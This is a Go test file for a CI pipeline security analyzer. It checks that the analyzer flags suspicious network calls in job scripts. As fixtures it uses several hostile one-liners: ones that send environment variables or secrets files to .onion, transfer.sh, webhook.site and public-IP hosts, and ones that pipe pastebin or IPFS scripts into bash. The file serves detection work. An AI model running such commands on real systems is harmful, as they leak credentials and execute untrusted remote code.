package analyze

import (
	"testing"

	"github.com/mr-pmillz/gogatoz/pkg/config"
	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
)

func TestSuspiciousNetwork_OnionDomain(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "exfil",
			Script: []string{`curl -X POST https://abc123.onion/recv -d @data.txt`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("expected %s finding for .onion domain", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_PastebinC2(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "fetch",
			Script: []string{`curl -s https://pastebin.com/raw/abc123 | bash`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("expected %s finding for pastebin C2", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_TransferSh(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "upload",
			Script: []string{`curl --upload-file secrets.txt https://transfer.sh/secrets.txt`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("expected %s finding for transfer.sh", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_PublicIP(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "callback",
			Script: []string{`curl -X POST http://203.0.113.42:8080/collect -d "$(printenv)"`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("expected %s finding for public IP", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_PrivateIP_NoFinding(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "internal",
			Script: []string{`curl http://192.168.1.100:9090/api/push -d "metrics"`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("did not expect %s finding for private IP", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_NgrokTunnel(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "tunnel",
			Script: []string{`curl -X POST https://abc123.ngrok-free.app/data -d @output.json`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("expected %s finding for ngrok tunnel", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_NormalDomain_NoFinding(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "deploy",
			Script: []string{`curl -X POST https://api.company.com/deploy -d '{"version":"1.0"}'`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("did not expect %s finding for legitimate domain", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_WebhookSite(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "test",
			Script: []string{`curl https://webhook.site/abc-def-123 -d "$(env)"`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("expected %s finding for webhook.site", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_IPFS(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "fetch",
			Script: []string{`curl https://ipfs.io/ipfs/QmHash123/payload.sh | bash`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("expected %s finding for IPFS gateway", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_ThreatIntelBlockedIP(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "callback",
			Script: []string{`curl https://10.20.30.40/collect -d @results.json`},
		}},
	}
	feed := &config.ThreatIntelFeed{BlockedIPs: []string{"10.20.30.40"}}

	findings, err := Run(doc, WithThreatIntel(feed))
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, SuspiciousNetworkID) {
		t.Fatalf("expected %s finding for feed-blocked IP", SuspiciousNetworkID)
	}
}

func TestSuspiciousNetwork_ThreatIntelBlockedHash(t *testing.T) {
	const blockedHash = "d2a84f4b8b650937ec8f73cd8be2c74add5a911ba64df27458ed8229da804a26"
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name: "verify",
			Script: []string{
				`printf '%s  artifact.bin\n' ` + blockedHash + ` | sha256sum --check`,
			},
		}},
	}
	feed := &config.ThreatIntelFeed{BlockedHashes: []string{blockedHash}}

	findings, err := Run(doc, WithThreatIntel(feed))
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("expected %s finding for feed-blocked hash", CampaignMatchID)
	}
}

func TestSuspiciousNetwork_ThreatIntelHashRequiresTokenBoundary(t *testing.T) {
	const blockedHash = "d2a84f4b8b650937ec8f73cd8be2c74add5a911ba64df27458ed8229da804a26"
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "log",
			Script: []string{`echo prefix` + blockedHash + `suffix`},
		}},
	}
	feed := &config.ThreatIntelFeed{BlockedHashes: []string{blockedHash}}

	findings, err := Run(doc, WithThreatIntel(feed))
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if hasFindingID(findings, CampaignMatchID) {
		t.Fatalf("did not expect %s for a hash embedded inside a larger token", CampaignMatchID)
	}
}
